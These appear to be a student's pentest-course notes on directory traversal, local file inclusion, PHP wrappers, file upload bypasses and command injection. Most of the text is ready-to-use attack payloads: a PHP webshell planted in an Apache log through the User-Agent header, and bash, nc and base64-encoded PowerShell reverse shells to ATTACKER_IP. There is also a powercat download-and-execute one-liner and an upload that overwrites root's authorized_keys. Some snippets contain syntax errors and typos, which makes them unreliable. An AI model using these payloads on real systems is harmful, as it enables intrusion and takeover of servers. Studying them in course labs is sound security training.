## Section 9.1 Directory Traversal
### Subsection 9.1.2 Identifying and Exploiting Directory Traversals
- Most websites are run in a subdirectory of a low privileged user called www-data
	- /var/www/html/
	- C:\inetpub\wwwroot
- SSH keys can usually be located in ~/.ssh/
- To SSH using a private key file do the following 
```
sudo chmod 400 KEY_FILE
```
```
rm ~/.ssh/known_hosts
```
```
ssh -i KEY_FILE user@IP
```
## Section 9.2 File Inclusion Vulnerabilities
### Subsection 9.2.1 Local File Inclusion (LFI)
- One way to achieve LFI is to include executable code in a local file like access.log at /var/log/apache2/ then browsing to the page which will execute our code
- LFI can be used to get a reverse shell or to add our authorized key to the authorized keys file 
- to generate an authorized key 
- Quick php one-liner for LFI or as a stand-alone file for web app cmd access
```
<?php echo system($_GET['cmd']; ?>)
```
- Sent the following as the user-agent in the header
	- This was saved to ../../../../../../../../../var/log/apache2/access.log
	- Now when this file is called wiht &cmd=COMMAND the output comes back with the log file information and the cmd output based on where it has been stored in the logs 
	- Did have to use url encoding for spaces doing this
```
# Header
User-Agent: <?php echo system($_GET['cmd']; ?>)
# url call 
http://IP/../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
- Bash one-liner for LFI (encode special characters with url encoding)
```
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"
```
### Subsection 9.2.2 PHP Wrappers
- Help to get the code via curl that is not in the webpage when it curled
- allow_url_include setting needs to be enabled in order to get code execution
- php wrappers from the course 
	- php://filter
		- displays the contents of files with or without encodings like ROT13 or Base64
		- helps analyze the web application's logic and look for sensitive information
```
http://IP/index.php?page=php://filter/resource=admin.php
http://IP/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
- php://data 
	- used to achieve code execution
	- used to embed data elements as plaintext or base64-encoded data running in the web application's code
	- this is an alternative when you cannot poison a local file with PHP code
```
http://IP/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
http://IP/index.php?page=data://text/plain;base64,BASE64_DATA&cmd=ls
```
## Section 9.3 File Upload Vulnerabilities
### Subsection 9.3.1 Using Executable Files
- PHP webshells that can be used for RFI can be found in 
```
/usr/share/webshells/php/
```
- .php files can be blocked on upload.  
	- by changing the extension to .PHp or .pHP or .phps or .php7 you may be able to bypass the filter
- Execution on a windows system
	- One-liner in powershell base64 to bypass a filter and get a reverse shell
```
$Text = '$client = New-Object System.Net.Sockets.TCPCient("SERVER_ADDRESS",SERVER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```
$EncodedText
```
- Copy and paste the output of $EncodedText as the command to get the reverse shell
### Subsection 9.3.2 Using Non-Executable Files
- This includes replacing the ~/.ssh/authorized_keys file with your authorized key
- To generate a key do the following
```
ssh-keygen
```
- filename can be anything but fileup works well
```
cat fileup.pub > authorized_keys
```
- In the burp or curl request make sure the filename goes to the correct folder such as 
```
filename="../../../../../../../root/.ssh/authorized_keys"
```
## Section 9.4 Command Injection
## Section 9.4.1 OS Command Injection
- To determine if cmd or powershell is being executed on a windows machine run the following command to see what interpreter is processing it
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- One-liner to run powercat from download
```
IEX(New-Object System.Net.WebClient).DownloadString("SERVER_ADDRESS/powercat.ps1");powercat -c LHOST -p LPORT -e powershell
```
- nc reverse shell from victim machine
```
# URL encode as needed
nc -e /bin/bash ATTACKER_IP ATTACKER_PORT
```
## Exercises To-Do

- [ ] 2.1.1 (page 20)